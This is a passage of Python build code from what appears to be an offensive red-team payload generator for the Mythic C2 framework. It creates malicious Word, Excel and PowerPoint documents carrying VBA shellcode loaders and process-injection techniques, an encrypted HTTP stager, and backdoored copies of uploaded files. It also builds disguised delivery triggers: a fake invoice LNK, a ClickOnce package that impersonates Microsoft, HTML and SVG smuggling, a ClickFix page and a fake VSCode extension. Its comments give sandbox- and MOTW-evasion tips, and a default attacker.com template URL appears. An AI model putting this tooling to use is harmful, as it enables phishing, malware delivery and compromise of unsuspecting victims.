                matrix_formats  = [x.strip() for x in _raw_formats.split(",")  if x.strip()] or None
                matrix_zip      = self.get_parameter("0.9u Matrix Zip Output")

                enc_method = ENCRYPTION_METHODS.get(self.get_parameter("2.1 Encryption Type"), "xor")
                enc_key    = self.get_parameter("2.2 Encryption Key")
                if enc_key == "NONE":
                    enc_key = None

                matrix_out = payload_dir / "maldoc_matrix"

                # Pre-bundle erebus_helper.py so the matrix can embed it.
                # The main helper-export step runs later in the pipeline; we
                # do it early here so the matrix zip is self-contained.
                _helper_src = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                _helper_out = payload_dir / "erebus_helper.py"
                _helper_ready = None
                if _helper_src.exists() and not _helper_out.exists():
                    try:
                        self._bundle_helper_as_single_file(_helper_src, _helper_out)
                        _helper_ready = _helper_out
                    except Exception as _he:
                        output += f"[!] Warning: could not pre-bundle helper for matrix: {_he}\n"
                elif _helper_out.exists():
                    _helper_ready = _helper_out

                try:
                    from erebus_wrapper.maldoc_matrix import build_matrix as _build_matrix
                    manifest = _build_matrix(
                        shellcode_path  = Path(mythic_shellcode_path),
                        output_dir      = matrix_out,
                        doc_name        = doc_name,
                        encryption      = enc_method,
                        enc_key         = enc_key,
                        loaders         = matrix_loaders,
                        triggers        = matrix_triggers,
                        formats         = matrix_formats,
                        obfuscate       = obfuscate,
                        target_process  = target_process,
                        export_bas      = True,
                        zip_output      = matrix_zip,
                        helper_path     = _helper_ready,
                    )

                    ok_count   = sum(1 for e in manifest["entries"] if e["status"] == "OK")
                    skip_count = sum(1 for e in manifest["entries"] if e["status"] == "SKIP")
                    fail_count = sum(1 for e in manifest["entries"] if e["status"] == "FAIL")

                    _loaders_used  = ", ".join(dict.fromkeys(e["loader"]  for e in manifest["entries"]))
                    _triggers_used = ", ".join(dict.fromkeys(e["trigger"] for e in manifest["entries"]))
                    _formats_used  = ", ".join(dict.fromkeys(e["format"]  for e in manifest["entries"]))

                    _matrix_msg = (
                        f"[+] MalDoc Matrix: {ok_count} built, {skip_count} skipped, {fail_count} failed.\n"
                        f"[*] Loaders  : {_loaders_used}\n"
                        f"[*] Triggers : {_triggers_used}\n"
                        f"[*] Formats  : {_formats_used}\n"
                        f"[*] Output   : payload/maldoc_matrix/  (MANIFEST.json + MANIFEST.txt inside)\n"
                        f"[*] COM bat  : payload/maldoc_matrix/build_matrix_com.bat"
                        f"  (copy matrix folder to Windows + run for COM re-injection)\n"
                    )
                    if matrix_zip:
                        _zip_path = matrix_out.with_suffix(".zip")
                        if _zip_path.exists():
                            _matrix_msg += f"[*] ZIP      : payload/maldoc_matrix.zip  ({_zip_path.stat().st_size:,} B)\n"

                    output += _matrix_msg
                    await self._build_step("[T1566.001] - Creating MalDoc", _matrix_msg, success=True)

                except Exception as e:
                    await self._build_step("[T1566.001] - Creating MalDoc", f"MalDoc Matrix build failed: {str(e)}", success=False)
                    response.status = BuildStatus.Error
                    response.build_stderr = f"MalDoc Matrix failed: {str(e)}"
                    return response

            ######################### MalDoc Single-Document Branch #########################
            if maldoc_mode not in ("None", "Build Matrix") and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                payload_dir = Path(agent_build_path) / "payload"
                maldoc_type = self.get_parameter("0.9a MalDoc Type")
                vba_trigger = self.get_parameter("0.9c VBA Execution Trigger")
                doc_name = self.get_parameter("0.9d Excel Document Name")
                obfuscate = self.get_parameter("0.9e Obfuscate VBA")
                injection_type = self.get_parameter("0.9f MalDoc Injection Type")
                try:
                    # Generate VBA payload code based on injection type
                    if injection_type == "Command Execution":
                        # Use WScript.Shell to execute trigger binary and command
                        trigger_binary = self.get_parameter("0.9f1 MalDoc Trigger Binary")
                        trigger_command = self.get_parameter("0.9f2 MalDoc Trigger Command")

                        # R3a: generate_command_execution_vba is registered by
                        # plugin_payload_maldocs and auto-discovered into the
                        # builder's globals by the R1c plugin-loader wiring.
                        # Pre-R3a, this block open-coded an inline
                        # `PayloadMalDocsPlugin()` instantiation because the
                        # plugin's validate() used to hard-fail without
                        # openpyxl, taking the VBA functions offline even on
                        # openpyxl-less hosts. R3a relaxed validate() so the
                        # plugin now loads in both cases.
                        vba_code = generate_command_execution_vba(
                            trigger_binary=trigger_binary,
                            trigger_command=trigger_command,
                            trigger_type=vba_trigger,
                        )

                    else:  # Shellcode Injection
                        loader_map = {
                            "VirtualAlloc + CreateThread":    "createthread",
                            "EnumSystemLocalesA Callback":    "enumlocales",
                            "QueueUserAPC Injection":         "queueuserapc",
                            "AddressOfEntryPoint Injection":  "hollowing",
                            "Early-Bird Injection":           "earlybird",
                        }
                        loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
                        http_stager_base = (self.get_parameter("0.9v HTTP Stager URL") or "").strip().rstrip("/")
                        output += f"[DEBUG] HTTP Stager URL param value: '{http_stager_base}'\n"

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()
                        _word_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        if http_stager_base:
                            # HTTP staging path:
                            # 1. RC4-encrypt shellcode with a random 16-byte key
                            # 2. Upload encrypted blob to Mythic file store → get AgentFileId
                            # 3. Construct download URL: <base>/direct/download/<uuid>
                            # 4. Generate tiny VBA that downloads + decrypts at runtime
                            # No shellcode embedded in VBA source - bypasses module size limits.
                            sc_bytes = open(mythic_shellcode_path, "rb").read()
                            rc4_key = secrets.token_bytes(16)
                            enc_bytes = plugin.rc4_encrypt_shellcode(sc_bytes, rc4_key)

                            output += f"[DEBUG] RC4-encrypted shellcode: {len(enc_bytes):,} bytes. Uploading to Mythic...\n"

                            file_create_resp = await SendMythicRPCFileCreate(
                                MythicRPCFileCreateMessage(
                                    PayloadUUID=self.uuid,
                                    FileContents=enc_bytes,
                                    Filename="shellcode.enc",
                                    DeleteAfterFetch=False,
                                )
                            )

                            output += f"[DEBUG] SendMythicRPCFileCreate result: Success={file_create_resp.Success} AgentFileId={file_create_resp.AgentFileId} Error={file_create_resp.Error}\n"

                            if not file_create_resp.Success or not file_create_resp.AgentFileId:
                                # Fallback: write encrypted blob to build artifacts so operator can host manually
                                enc_path = Path(agent_build_path) / "payload" / "shellcode.enc"
                                enc_path.parent.mkdir(parents=True, exist_ok=True)
                                enc_path.write_bytes(enc_bytes)
                                await self._fail_step(
                                    "[T1566.001] - Creating MalDoc",
                                    f"Mythic file upload failed ({file_create_resp.Error}). "
                                    f"shellcode.enc written to build artifacts - host it manually at {http_stager_base}/shellcode.enc "
                                    f"or rebuild with the correct base URL after fixing the upload issue.",
                                    f"HTTP stager upload failed: {file_create_resp.Error}",
                                )
                                return response

                            staging_url = f"{http_stager_base}/direct/download/{file_create_resp.AgentFileId}"

                            output += (
                                f"[+] HTTP stager: shellcode RC4-encrypted ({len(enc_bytes):,} bytes) "
                                f"and uploaded to Mythic (AgentFileId: {file_create_resp.AgentFileId}).\n"
                                f"[+] Staging URL embedded in VBA: {staging_url}\n"
                                f"[*] RC4 key embedded in VBA (16 bytes). No shellcode in VBA source.\n"
                            )
                            await self._build_step(
                                "[T1566.001] - Creating MalDoc",
                                f"HTTP stager: {len(enc_bytes):,}B uploaded → {staging_url}",
                                success=True,
                            )

                            vba_code = plugin.generate_http_stager_vba(
                                url=staging_url,
                                rc4_key=rc4_key,
                                trigger_type=vba_trigger,
                                loader_type=loader_type,
                                target_process=target_process or "C:\\Windows\\System32\\notepad.exe",
                                is_word=_word_fmt in ("docm", "doc"),
                                obfuscate_url=bool(obfuscate),
                            )

                        else:
                            # Embedded path: convert shellcode to VBA format using shellcrypt.
                            # Use -o <temp_file> so shellcrypt writes raw VBA directly to
                            # disk instead of via Rich console.print, which wraps long
                            # lines at terminal width when stdout is piped and would
                            # split "key = Array(...)" across lines, breaking the output.
                            vba_fd, vba_tmp = tempfile.mkstemp(suffix='.vba')
                            os.close(vba_fd)

                            cmd = [
                                "python",
                                shellcrypt_path,
                                "-i", mythic_shellcode_path,
                                "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                                "-f", "vba",
                                "-a", "shellcode",
                                "-o", vba_tmp,
                            ]

                            if self.get_parameter("2.2 Encryption Key") != "NONE":
                                cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                            if self.get_parameter("2.0 Compression Type") != "NONE":
                                cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                            _proc = await asyncio.create_subprocess_exec(
                                *cmd,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.PIPE,
                            )
                            _out, _err = await _proc.communicate()
                            if _proc.returncode != 0:
                                raise subprocess.CalledProcessError(_proc.returncode, cmd, _out + _err)

                            shellcode_vba = open(vba_tmp, 'r').read()
                            os.unlink(vba_tmp)

                            output += f"[DEBUG] Shellcrypt VBA output length: {len(shellcode_vba)} bytes\n"
                            output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
                            output += f"[DEBUG] Target process: {target_process}\n"

                            if _word_fmt in ("docm", "doc"):
                                vba_code = plugin.generate_word_vba_loader(
                                    vba_shellcode=shellcode_vba,
                                    trigger_type=vba_trigger,
                                    loader_type=loader_type,
                                    target_process=target_process,
                                )
                            else:
                                vba_code = plugin.generate_shellcode_injection_vba(
                                    vba_shellcode=shellcode_vba,
                                    trigger_type=vba_trigger,
                                    loader_type=loader_type,
                                    target_process=target_process,
                                )

                    if obfuscate:
                        vba_code = await self.obfuscate_vba(vba_code)

                    # Handle VBA Module Only export
                    if maldoc_mode == "VBA Module Only":
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()

                        # Export as .bas file (importable VBA module)
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        bas_path = plugin.export_vba_as_bas(
                            vba_code=vba_code,
                            output_path=str(bas_output),
                            module_name=doc_name
                        )

                        # Also export as plain text for reference
                        txt_output = payload_dir / f"{doc_name}_payload.txt"
                        plugin.export_vba_as_text(vba_code, str(txt_output))

                        success_msg = f"[+] Created VBA module for manual import: {bas_path.name}\n"
                        success_msg += f"[*] .bas file can be imported into Excel via VBA Editor > File > Import\n"
                        success_msg += f"[*] .txt file contains the raw VBA code for reference"

                        output += success_msg + "\n"

                        await self._build_step("[T1566.001] - Creating MalDoc", success_msg, success=True)

                    elif maldoc_type == "Create New":
                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                        _plugin = _MDP()

                        # Export .bas for manual re-injection regardless of format
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)

                        if maldoc_fmt in ("pptm", "ppam"):
                            # --- PowerPoint path (pure Python, no COM needed) ---
                            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _ODP
                            _odp = _ODP()
                            ppt_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
                            if maldoc_fmt == "ppam":
                                _odp.create_ppam_payload(vba_source=vba_code, output_path=str(ppt_output))
                                success_msg = (
                                    f"[+] Created {ppt_output.name} (PowerPoint Add-In).\n"
                                    "[*] Victim must open .ppam once; PowerPoint then auto-executes on every launch.\n"
                                    "[*] VBA embedded as .bas sidecar in ppt/vbaProject.bas - inject via olevba/LibreOffice for full VBA.\n"
                                )
                            else:
                                _odp.create_pptm_payload(vba_source=vba_code, output_path=str(ppt_output))
                                success_msg = (
                                    f"[+] Created {ppt_output.name} (PowerPoint macro-enabled presentation).\n"
                                    "[*] VBA embedded as .bas sidecar in ppt/vbaProject.bas - inject via olevba/LibreOffice for full VBA.\n"
                                )
                            output += success_msg

                        elif maldoc_fmt == "docx-remote-template":
                            # --- DOTM remote template injection path ---
                            from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _ODP
                            _odp = _ODP()
                            dotm_url = self.get_parameter("0.9q DOTM Remote URL") or "https://attacker.com/template.dotm"
                            docx_output = payload_dir / f"{doc_name}.docx"
                            _odp.create_dotm_template_injection(
                                template_url=dotm_url,
                                output_path=str(docx_output),
                            )
                            success_msg = (
                                f"[+] Created {docx_output.name} - fetches DOTM from: {dotm_url}\n"
                                "[*] Host the DOTM on a redirector; serve 404 after first retrieval to frustrate sandbox re-fetch.\n"
                                "[*] Pair with ISO/VHD container to suppress MOTW and avoid Protected View.\n"
                            )
                            output += success_msg

                        elif maldoc_fmt in ("docm", "doc"):
                            # --- Word path ---
                            # Always produce .docm on server (ZIP-based, no COM needed).
                            # For .doc, build_maldoc.bat converts via Word COM on Windows.
                            docm_output = payload_dir / f"{doc_name}.docm"
                            word_template_path = _plugin._resolve_word_template_path(docm_output)

                            shipped_template_name = None
                            if word_template_path and word_template_path.exists():
                                shipped_template_name = word_template_path.name
                                shutil.copy2(str(word_template_path), str(payload_dir / shipped_template_name))
                                _plugin.create_new_word_with_payload(
                                    output_path=docm_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                    template_path=word_template_path,
                                )
                                success_msg = f"[+] Compiled {docm_output.name} from {word_template_path.name} template.\n"
                            else:
                                _plugin.create_new_word_with_payload(
                                    output_path=docm_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                )
                                success_msg = f"[+] Created {docm_output.name} (no template, built from scratch).\n"

                            output += f"[+] Created DOCM: {docm_output.name}\n"

                            # bat handles both docm (re-inject) and doc (COM SaveAs)
                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{doc_name}.{maldoc_fmt}" --module-name "{doc_name}"'
                            if shipped_template_name:
                                bat_cmd += f' --template "{shipped_template_name}"'
                            if maldoc_fmt == "doc":
                                bat_cmd += f' --source-docm "{docm_output.name}"'
                                output += f"[*] build_maldoc.bat will convert {docm_output.name} -> {doc_name}.doc via Word COM (run on Windows)\n"
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for Windows-side COM re-injection\n"

                        else:
                            # --- Excel path (xlsm / xlsx / xlam) ---
                            excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
                            template_path = _plugin._resolve_template_path(excel_output)

                            shipped_template_name = None
                            if template_path and template_path.exists():
                                shipped_template_name = template_path.name
                                shutil.copy2(str(template_path), str(payload_dir / shipped_template_name))

                                _plugin.create_new_excel_with_payload(
                                    output_path=excel_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                    template_path=template_path,
                                )
                                success_msg = f"[+] Compiled {excel_output.name} from {template_path.name} template.\n"
                                output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"
                            else:
                                _plugin.create_new_excel_with_payload(
                                    output_path=excel_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                )
                                success_msg = f"[+] Created {excel_output.name} (no template found, built from scratch).\n"
                                output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"

                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"'
                            if shipped_template_name:
                                bat_cmd += f' --template "{shipped_template_name}"'
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"

                    else:  # Backdoor Existing
                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                        _plugin = _MDP()

                        # Export .bas for manual re-injection regardless of format
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)

                        # Retrieve uploaded source file (works for both Excel and Word)
                        source_file_uuid = self.get_parameter("0.9b Excel Source File")
                        source_file_path = None
                        source_file_name = None
                        original_filename = None

                        if source_file_uuid:
                            file_resp = await SendMythicRPCFileGetContent(
                                MythicRPCFileGetContentMessage(AgentFileId=source_file_uuid)
                            )
                            if file_resp.Success:
                                file_name_resp = await SendMythicRPCFileSearch(
                                    MythicRPCFileSearchMessage(AgentFileID=source_file_uuid)
                                )
                                default_ext = "docm" if maldoc_fmt in ("docm", "doc") else "xlsm"
                                original_filename = f"document.{default_ext}"
                                if file_name_resp.Success and len(file_name_resp.Files) > 0:
                                    original_filename = file_name_resp.Files[0].Filename

                                source_file_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
                                source_file_path = payload_dir / source_file_name
                                source_file_path.write_bytes(file_resp.Content)

                        if maldoc_fmt in ("docm", "doc"):
                            # --- Word backdoor path ---
                            if source_file_path is None:
                                # Fall back to Word template
                                word_tmpl = _plugin._resolve_word_template_path(
                                    payload_dir / f"{doc_name}.docm"
                                )
                                if word_tmpl and word_tmpl.exists():
                                    original_filename = word_tmpl.name
                                    source_file_name = word_tmpl.name
                                    source_file_path = payload_dir / source_file_name
                                    shutil.copy2(str(word_tmpl), str(source_file_path))
                                    output += f"[*] No Word file uploaded, using {word_tmpl.name} template\n"
                                else:
                                    raise ValueError(
                                        "No Word file provided for backdooring and no template.docm found"
                                    )

                            output_name = f"{Path(original_filename).stem}_backdoored.docm"
                            doc_output = payload_dir / output_name
                            _plugin.backdoor_word_document(
                                source_path=source_file_path,
                                output_path=doc_output,
                                vba_code=vba_code,
                            )
                            success_msg = (
                                f"[+] Backdoored {original_filename} -> {doc_output.name}\n"
                                f"[*] Source file kept at {source_file_name}\n"
                            )
                            output += f"[+] Created backdoored DOCM: {doc_output.name}\n"

                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-docm "{doc_output.name}" --output "{doc_name}.{maldoc_fmt}" --module-name "{doc_name}"'
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for Windows-side COM re-injection\n"

                        else:
                            # --- Excel backdoor path (xlsm / xlsx / xlam) ---
                            if source_file_path is None:
                                template_path = _plugin._resolve_template_path(
                                    payload_dir / f"{doc_name}.{maldoc_fmt}"
                                )
                                if template_path and template_path.exists():
                                    original_filename = template_path.name
                                    source_file_name = template_path.name
                                    source_file_path = payload_dir / source_file_name
                                    shutil.copy2(str(template_path), str(source_file_path))
                                    output += f"[*] No Excel file uploaded, using {template_path.name} template\n"
                                else:
                                    raise ValueError(
                                        "No Excel file provided for backdooring and no template found"
                                    )

                            output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
                            excel_output = payload_dir / output_name
                            _plugin.backdoor_excel_document(
                                source_path=source_file_path,
                                output_path=excel_output,
                                vba_code=vba_code,
                            )
                            success_msg = (
                                f"[+] Backdoored {original_filename} -> {excel_output.name}\n"
                                f"[*] Source file kept at {source_file_name}\n"
                            )
                            output += f"[+] Created backdoored {maldoc_fmt.upper()}: {excel_output.name}\n"

                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_file_name}" --output "{excel_output.name}" --module-name "{doc_name}"'
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"

                    await self._build_step("[T1566.001] - Creating MalDoc", success_msg, success=True)

                except Exception as e:
                    await self._build_step("[T1566.001] - Creating MalDoc", f"Failed to create/backdoor document: {str(e)}", success=False)
                    response.status = BuildStatus.Error
                    response.build_stderr = f"MalDoc creation failed: {str(e)}"
                    return response

            ######################### End of MalDoc Section #########################
            ######################### Trigger Generation Section #########################

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") == "MalDoc":
                await self._build_step("[T1137.006] - Adding Trigger", "Skipping Trigger Generation (MalDoc selected as source).", success=True)

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") != "MalDoc":

                payload_dir = Path(agent_build_path) / "payload"
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file = decoy_dir / "decoy.pdf"

                target_os = self.get_parameter("0.0 Target OS")
                if target_os == "Linux":
                    trigger_type = self.get_parameter("0.9-L Linux Trigger Type")
                elif target_os == "macOS":
                    trigger_type = self.get_parameter("0.9-M macOS Trigger Type")
                else:
                    trigger_type = self.get_parameter("0.9 Trigger Type")

                try:
                    trigger_path = ""

                    match trigger_type:
                        case "LNK":
                            trigger_bin  = str(self.get_parameter("0.9a Trigger Binary"))
                            trigger_args = str(self.get_parameter("0.9b Trigger Command"))
                            _lnk_icon    = str(self.get_parameter("0.9n LNK Icon") or "pdf")
                            try:
                                _lnk_pad = int(str(self.get_parameter("0.9o LNK Argument Pad") or "260"))
                            except (ValueError, TypeError):
                                _lnk_pad = 260

                            # Load the helper's trigger_lnk module via path so
                            # the dot-in-directory name doesn't break imports.
                            _helper_root  = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                            _lnk_mod_path = _helper_root / "modules" / "trigger_lnk.py"
                            import importlib.util as _ilu
                            _lnk_spec = _ilu.spec_from_file_location("_helper_trigger_lnk", str(_lnk_mod_path))
                            _lnk_mod  = _ilu.module_from_spec(_lnk_spec)
                            _lnk_spec.loader.exec_module(_lnk_mod)

                            _icon_src, _icon_idx = _lnk_mod.get_icon_by_alias(_lnk_icon)

                            # Use '!' as a placeholder for '%' in arguments so
                            # env-var tokens in trigger_args are not expanded by
                            # the shell during LNK creation; the module swaps
                            # them back after writing the file.
                            _lnk_args_safe = trigger_args.replace("%", "!")

                            trigger_path = _lnk_mod.create_payload_trigger(
                                target_bin      = trigger_bin,
                                args            = _lnk_args_safe,
                                icon_src        = _icon_src,
                                icon_index      = _icon_idx,
                                description     = "Invoice",
                                payload_dir     = payload_dir,
                                decoy_file      = decoy_file,
                                output_filename = "invoice.pdf.lnk",
                                window_mode     = "minimized",
                                pad             = _lnk_pad,
                                search          = "!",
                                replace         = "%",
                                mimic_as_file   = "Document",
                            )

                            # Write a rebuild helper so the operator can
                            # re-create the LNK on a Windows host if COM /
                            # pywin32 was unavailable at build time.
                            lnk_name = trigger_path.name if hasattr(trigger_path, "name") else str(trigger_path).split(os.sep)[-1]
                            bat_lines = [
                                "@echo off",
                                "REM Re-create LNK with native COM icon resolution on a Windows host.",
                                "REM Run this after extracting the payload archive if the LNK icon is incorrect.",
                                f'python erebus_helper.py lnk --target-binary "{trigger_bin}" --arguments "{trigger_args}" --icon "{_lnk_icon}" --pad {_lnk_pad} --output "{lnk_name}"',
                                "echo LNK created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_lnk.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")

                        case "BAT":
                            trigger_path = create_bat_payload_trigger(
                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
                                args=str(self.get_parameter("0.9b Trigger Command")),
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "MSI":
                            trigger_path = await asyncio.get_running_loop().run_in_executor(
                                None, lambda: create_msi_payload_trigger(
                                    payload_exe="erebus.exe",
                                    payload_dir=payload_dir,
                                    decoy_file=decoy_file,
                                )
                            )
                        case "ClickOnce":
                            trigger_path = await create_clickonce_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                                app_name="System Update",
                                app_publisher="Microsoft Corporation"
                            )

                        case "MSC":
                            trigger_path = create_msc_explorer_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "HTML":
                            # Find the compiled payload in the payload directory
                            payload_exe = payload_dir / "erebus.exe"
                            if not payload_exe.exists():
                                for ext in ["dll", "xll"]:
                                    candidate = payload_dir / f"erebus.{ext}"
                                    if candidate.exists():
                                        payload_exe = candidate
                                        break

                            download_name = payload_exe.name
                            trigger_path = create_html_smuggling_trigger(
                                payload_path=str(payload_exe),
                                output_filename="document.html",
                                download_name=download_name,
                                payload_dir=payload_dir,
                            )

                        case "ClickFix":
                            clickfix_cmd = self.get_parameter("0.9c ClickFix Command")
                            trigger_path = create_clickfix_trigger(
                                command=clickfix_cmd,
                                output_filename="verify.html",
                                payload_dir=payload_dir,
                            )

                        case "HTA":
                            # Combine trigger binary + command into the shell command run
                            # inside the HTA via WScript.Shell.Run.
                            # Default: conhost.exe --headless cmd.exe /Q /c payload.exe
                            trigger_path = create_hta_trigger(
                                command=(
                                    f"{self.get_parameter('0.9a Trigger Binary')} "
                                    f"{self.get_parameter('0.9b Trigger Command')}"
                                ).strip(),
                                output_filename="setup.hta",
                                payload_dir=payload_dir,
                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
                            )

                        case "VSCode":
                            _vsix_prebuilt = None
                            try:
                                if loader_format == "dll" and os.path.exists(payload_output_file):
                                    _vsix_prebuilt = pathlib.Path(payload_output_file)
                            except NameError:
                                pass
                            _vscode_fake_name = self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools"
                            _vscode_publisher = self.get_parameter("0.9x VSCode Publisher") or "ms-python"
                            _vscode_sc_path = pathlib.Path(mythic_shellcode_path)

                            _vscode_icon_path = None
                            _vscode_icon_uuid = self.get_parameter("0.9y VSCode Custom Icon")
                            if _vscode_icon_uuid:
                                _icon_resp = await SendMythicRPCFileGetContent(
                                    MythicRPCFileGetContentMessage(AgentFileId=_vscode_icon_uuid)
                                )
                                if _icon_resp.Success and _icon_resp.Content:
                                    _vscode_icon_path = pathlib.Path(payload_dir) / "vscode_icon.png"
                                    _vscode_icon_path.write_bytes(_icon_resp.Content)
                                else:
                                    output += "[!] VSCode custom icon was uploaded but could not be retrieved - falling back to no icon.\n"

                            trigger_path = await asyncio.get_running_loop().run_in_executor(
                                None, lambda: create_vscode_ext_trigger(
                                    shellcode_path=_vscode_sc_path,
                                    payload_dir=payload_dir,
                                    decoy_file=decoy_file,
                                    fake_name=_vscode_fake_name,
                                    publisher=_vscode_publisher,
                                    output_filename="installer.vsix",
                                    prebuilt_dll_path=_vsix_prebuilt,
                                    custom_icon_path=_vscode_icon_path,
                                )
                            )

                            if trigger_path and pathlib.Path(trigger_path).exists():
                                _vsix_abs = pathlib.Path(trigger_path).resolve()
                                for _item in list(payload_dir.iterdir()):
                                    if _item.resolve() == _vsix_abs:
                                        continue
                                    if _item.is_dir():
                                        shutil.rmtree(_item, ignore_errors=True)
                                    else:
                                        try:
                                            _item.unlink()
                                        except Exception:
                                            pass

                        case "URL":
                            trigger_path = create_url_trigger(
                                target_url=str(self.get_parameter("0.9d URL Target")),
                                output_filename="document.url",
                                payload_dir=payload_dir,
                            )

                        case "JS":
                            trigger_path = create_jscript_trigger(
                                command=(
                                    f"{self.get_parameter('0.9a Trigger Binary')} "
                                    f"{self.get_parameter('0.9b Trigger Command')}"
                                ).strip(),
                                output_filename="update.js",
                                payload_dir=payload_dir,
                                obfuscate_command=True,
                                decoy_path=str(decoy_file) if decoy_file.exists() else "",
                            )

                        case "CHM":
                            chm_project_dir = create_chm_project(
                                executable=self.get_parameter("0.9a Trigger Binary") or r"C:\Windows\System32\rundll32.exe",
                                arguments=self.get_parameter("0.9b Trigger Command") or "",
                                output_dir=str(payload_dir / "chm_project"),
                                chm_name="document.chm",
                                title="Help Documentation",
                            )
                            trigger_path = chm_project_dir

                        case "SVG":
                            _svg_exe = payload_dir / "erebus.exe"
                            for _ext in ("dll", "xll"):
                                _cand = payload_dir / f"erebus.{_ext}"
                                if _cand.exists():
                                    _svg_exe = _cand
                                    break
                            trigger_path = create_svg_smuggling_trigger(
                                payload_path=str(_svg_exe),
                                output_filename="document.svg",
                                payload_dir=payload_dir,
                                download_name=_svg_exe.name,
                                obfuscate_b64=True,
                            )

                        case "HTML-Encrypted":
                            _enc_exe = payload_dir / "erebus.exe"
                            for _ext in ("dll", "xll"):
                                _cand = payload_dir / f"erebus.{_ext}"
                                if _cand.exists():
                                    _enc_exe = _cand
                                    break
                            trigger_path = create_encrypted_html_smuggling_trigger(
                                payload_path=str(_enc_exe),
                                password=str(self.get_parameter("0.9e HTML Password") or "Passw0rd!"),
                                output_filename="document.html",
                                download_name=_enc_exe.name,
                                payload_dir=payload_dir,
                            )

                        case "HTML-Geofenced":
                            _geo_exe = payload_dir / "erebus.exe"
                            for _ext in ("dll", "xll"):
                                _cand = payload_dir / f"erebus.{_ext}"
                                if _cand.exists():
                                    _geo_exe = _cand
                                    break
                            _countries_raw = str(self.get_parameter("0.9f Allowed Countries") or "US,GB,CA")
